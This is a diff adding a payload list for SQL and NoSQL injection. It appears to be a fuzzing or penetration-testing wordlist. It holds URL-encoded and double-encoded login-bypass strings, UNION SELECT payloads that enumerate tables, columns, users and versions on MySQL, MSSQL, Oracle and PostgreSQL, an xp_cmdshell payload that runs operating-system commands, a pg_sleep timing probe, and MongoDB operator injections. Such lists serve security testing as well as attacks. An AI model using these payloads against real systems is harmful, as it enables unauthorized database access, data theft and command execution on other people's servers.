@@ -1,1 +1,35 @@
-a
+# Encoded Payloads
+%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27--
+%2527%2520OR%2520%25271%2527%253D%25271
+
+# Special Characters
+\' OR \'1\'=\'1
+'' OR ''=''
+' OR username LIKE '%admin%'
+
+# Database Specific - MySQL
+' OR 1=1 LIMIT 1--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+
+# Database Specific - MSSQL
+' UNION SELECT name FROM sysobjects WHERE xtype='U'--
+'; EXEC xp_cmdshell('dir')--
+' UNION SELECT name FROM master..sysdatabases--
+
+# Database Specific - Oracle
+' UNION SELECT banner FROM v$version--
+' UNION SELECT table_name FROM all_tables--
+' UNION SELECT username FROM all_users--
+
+# Database Specific - PostgreSQL
+' UNION SELECT version()--
+' UNION SELECT table_name FROM information_schema.tables--
+'; SELECT pg_sleep(5)--
+
+# NoSQL Injection (MongoDB)
+'||'1'=='1
+{"$gt": ""}
+{"$ne": null}
+{"$where": "1==1"}
